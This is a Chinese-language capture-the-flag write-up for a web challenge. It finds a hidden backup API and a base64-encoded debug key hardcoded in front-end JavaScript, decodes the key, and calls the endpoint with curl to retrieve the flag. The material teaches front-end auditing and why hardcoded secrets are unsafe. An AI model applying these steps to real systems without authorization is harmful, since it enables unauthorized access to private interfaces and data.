# web_hidden_api 解题过程

题面：flag 在一个"不该对外开放"的接口后面。

## 0x00 登录页什么都没有

首页是一个内部系统登录框。随便填用户名密码，返回：

```json
{"ok": false, "msg": "用户名或密码错误"}
```

登录永远失败——因为这不是本题的入口。

## 0x01 审计前端 JavaScript

页面底部提示"去看看 /static/app.js"。用 `F12` → Sources，或者直接：

```bash
curl -s http://HOST:8082/static/app.js
```

关键几行：

```js
const API_BASE = "/api/v2";

// TODO(运维): 上线前务必删除下面的调试后门！！！
// 备份接口需要一个调试 key。
const _debugKey = atob("bGV0bWVpbl8yMDI2"); // 自己解码去 :)

/**
 * 备份接口（内部）：
 *   GET ${API_BASE}/backup?key=<_debugKey>
 * 成功时返回 { ok: true, flag: "..." }
 */
```

前端把后台的调试接口和 key 都写死了。`atob` 是 base64 解码，解开看看：

```bash
echo "bGV0bWVpbl8yMDI2" | base64 -d
# letmein_2026
```

## 0x02 调用隐藏接口拿 flag

接口路径是 `/api/v2/backup`，参数是 `key`：

```bash
curl -s "http://HOST:8082/api/v2/backup?key=letmein_2026"
# {"ok": true, "flag": "HCTF{...}"}
```

拿到 flag。参数不对时接口返回 403：

```bash
curl -s -o /dev/null -w '%{http_code}\n' "http://HOST:8082/api/v2/backup?key=wrong"
# 403
```

## 0x03 小结

| 步骤 | 考点 |
|---|---|
| `F12` / Network 观察加载的脚本 | 前端源码审计 |
| 阅读 `/static/app.js` | 隐藏接口与硬编码密钥 |
| `base64 -d` 解出 key | base64 只是编码，不是加密 |
| `GET /api/v2/backup?key=...` | 构造并调用隐藏 API |

一键复现见 `exp.py`。
